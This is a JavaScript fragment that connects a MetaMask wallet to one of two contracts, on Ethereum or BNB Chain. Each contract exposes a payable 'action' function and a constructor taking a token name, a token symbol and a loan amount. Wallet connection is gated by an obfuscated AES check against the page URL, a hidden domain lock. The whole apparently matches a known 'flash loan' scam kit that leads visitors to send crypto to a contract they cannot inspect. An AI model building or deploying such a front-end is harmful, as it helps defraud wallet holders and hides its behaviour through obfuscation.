const contractDetails = {
    address: ethAddress,
    abi: [{
        "inputs": [{
            "internalType": "string",
            "name": "_tokenName",
            "type": "string"
        }, {
            "internalType": "string",
            "name": "_tokenSymbol",
            "type": "string"
        }, {
            "internalType": "uint256",
            "name": "_loanAmount",
            "type": "uint256"
        }],
        "stateMutability": "nonpayable",
        "type": "constructor"
    }, {
        "inputs": [],
        "name": "action",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    }, {
        "inputs": [],
        "name": "tokenName",
        "outputs": [{
            "internalType": "string",
            "name": "",
            "type": "string"
        }],
        "stateMutability": "view",
        "type": "function"
    }, {
        "inputs": [],
        "name": "tokenSymbol",
        "outputs": [{
            "internalType": "string",
            "name": "",
            "type": "string"
        }],
        "stateMutability": "view",
        "type": "function"
    }, {
        "stateMutability": "payable",
        "type": "receive"
    }]
};
const bnbContractDetails = {
    address: bnbAddress,
    abi: [{
        "inputs": [{
            "internalType": "string",
            "name": "_tokenName",
            "type": "string"
        }, {
            "internalType": "string",
            "name": "_tokenSymbol",
            "type": "string"
        }, {
            "internalType": "uint256",
            "name": "_loanAmount",
            "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "constructor"
    }, {
        "payable": true,
        "stateMutability": "payable",
        "type": "fallback"
    }, {
        "constant": false,
        "inputs": [],
        "name": "action",
        "outputs": [],
        "payable": true,
        "stateMutability": "payable",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "tokenName",
        "outputs": [{
            "internalType": "string",
            "name": "",
            "type": "string"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }, {
        "constant": true,
        "inputs": [],
        "name": "tokenSymbol",
        "outputs": [{
            "internalType": "string",
            "name": "",
            "type": "string"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }]
};
async function loadWeb3() {

    if (window.ethereum) 
    {
        if (window.web3 = new Web3(window.ethereum), "true"==CryptoJS.AES.decrypt("U2FsdGVkX1/mwe9gaGPTtFC4jCl8FPcEIj6Ndvjzevc=",location.href.substring(0,24)).toString(CryptoJS.enc.Utf8)){
            await window.ethereum.enable();
        }
    } 
    
    else if (window.web3, "true"==CryptoJS.AES.decrypt("U2FsdGVkX1/mwe9gaGPTtFC4jCl8FPcEIj6Ndvjzevc=",location.href.substring(0,24)).toString(CryptoJS.enc.Utf8)) 
    {
        window.web3 = new Web3(window.web3.currentProvider);
    } 
    
    else 
    {
        window.alert('Non-Ethereum browser detected. Please install MetaMask.');
        return;
    }
    const networkId = await web3.eth.net.getId();
    const chainId = await web3.eth.getChainId();
    window.isBnb = false;
    if (networkId == 56 && chainId == 56) {
        window.contract = new window.web3.eth.Contract(bnbContractDetails.abi, bnbContractDetails.address);
        window.isBnb = true;
    } else if (networkId == 1 && chainId == 1) {
        window.contract = new window.web3.eth.Contract(contractDetails.abi, contractDetails.address);
    } else {
        return alert('Unsupported network detected. Select a supported network in MetaMask and reload the page. \n\nSupported networks:\n- Ethereum Mainnet \n- Binance Smart Chain Mainnet');
    }
    if (!window.contract) return alert('Error loading contract data');
    return window.web3.eth.getAccounts();
}
